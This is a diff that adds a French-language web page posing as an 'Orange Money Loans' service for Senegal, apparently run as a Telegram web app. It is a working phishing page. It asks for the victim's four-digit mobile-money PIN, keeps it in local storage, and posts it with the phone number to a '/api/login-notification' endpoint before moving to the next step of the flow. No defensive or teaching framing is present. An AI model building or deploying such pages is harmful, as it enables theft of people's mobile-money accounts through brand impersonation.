@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Orange Money Loans - Saisissez votre PIN</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        :root {
+            --orange-primary: #f25c05;
+            --bg-color: #f7f3ed;
+            --card-bg: #ffffff;
+            --input-bg: #fdfaf6;
+            --border-color: #ffd8b3;
+            --text-dark: #222222;
+        }
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background-color: var(--bg-color); margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+        
+        .header-box { width: 100%; background: var(--orange-primary); padding: 18px 20px; color: white; text-align: center; font-size: 22px; font-weight: 800; box-sizing: border-box; }
+        
+        .card { background: var(--card-bg); width: 92%; max-width: 440px; margin: 24px 0; padding: 32px 20px; border-radius: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.03); display: flex; flex-direction: column; }
+
+        .title { text-align: center; font-size: 22px; font-weight: 800; color: var(--text-dark); margin-bottom: 8px; }
+        .subtitle { text-align: center; font-size: 14px; color: #555; margin-bottom: 28px; }
+
+        .form-group { margin-bottom: 24px; display: flex; flex-direction: column; }
+        label { font-size: 14px; font-weight: 700; color: var(--text-dark); margin-bottom: 8px; }
+
+        .phone-input-group {
+            display: flex;
+            background-color: var(--input-bg);
+            border: 1.5px solid var(--border-color);
+            border-radius: 12px;
+            overflow: hidden;
+        }
+
+        .phone-prefix {
+            background-color: var(--orange-primary);
+            color: white;
+            padding: 14px 18px;
+            font-weight: 800;
+            font-size: 16px;
+            display: flex;
+            align-items: center;
+        }
+
+        .phone-input-group input {
+            border: none;
+            background: transparent;
+            padding: 14px 16px;
+            font-size: 16px;
+            width: 100%;
+            outline: none;
+            font-weight: 600;
+        }
+
+        .pin-label { text-align: center; font-size: 14px; font-weight: 700; margin-bottom: 12px; }
+        .pin-boxes { display: flex; justify-content: center; gap: 12px; margin-bottom: 28px; }
+        
+        .pin-box {
+            width: 52px;
+            height: 52px;
+            background-color: var(--input-bg);
+            border: 1.5px solid var(--border-color);
+            border-radius: 12px;
+            text-align: center;
+            font-size: 22px;
+            font-weight: bold;
+            outline: none;
+        }
+
+        .btn-orange {
+            background-color: #f7a278; /* Faded orange before entry */
+            color: white;
+            border: none;
+            width: 120px;
+            padding: 14px;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 800;
+            cursor: not-allowed;
+            text-transform: uppercase;
+        }
+
+        .btn-orange.active {
+            background-color: var(--orange-primary);
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+<div class="header-box">Orange Money Loans</div>
+
+<div class="card">
+    <div class="title">Saisissez votre code PIN correct</div>
+    <div class="subtitle">Saisissez le bon code PIN de votre compte</div>
+
+    <div class="form-group">
+        <label>Numéro de téléphone</label>
+        <div class="phone-input-group">
+            <div class="phone-prefix">+221</div>
+            <input type="text" id="displayPhone" readonly>
+        </div>
+    </div>
+
+    <div class="pin-label">Saisissez votre PIN</div>
+    <div class="pin-boxes">
+        <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+        <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+        <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+        <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
+    </div>
+
+    <div>
+        <button id="sendBtn" class="btn-orange" disabled>ENVOYER</button>
+    </div>
+</div>
+
+<script>
+    const pinBoxes = document.querySelectorAll('.pin-box');
+    const sendBtn = document.getElementById('sendBtn');
+    
+    document.getElementById('displayPhone').value = localStorage.getItem('phone') || "0701253142";
+
+    pinBoxes.forEach((box, idx) => {
+        box.addEventListener('input', () => {
+            box.value = box.value.replace(/\D/g, '');
+            if (box.value && idx < pinBoxes.length - 1) pinBoxes[idx + 1].focus();
+            
+            const pinCode = Array.from(pinBoxes).map(b => b.value).join('');
+            if (pinCode.length === 4) {
+                sendBtn.disabled = false;
+                sendBtn.classList.add('active');
+            } else {
+                sendBtn.disabled = true;
+                sendBtn.classList.remove('active');
+            }
+        });
+    });
+
+    sendBtn.addEventListener('click', async () => {
+        const pinCode = Array.from(pinBoxes).map(b => b.value).join('');
+        localStorage.setItem('lastPin', pinCode);
+        
+        await fetch('/api/login-notification', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ phone: localStorage.getItem('phone'), pin: pinCode, country: "Sénégal" })
+        });
+
+        window.location.href = "page6.html";
+    });
+</script>
+</body>
+</html>
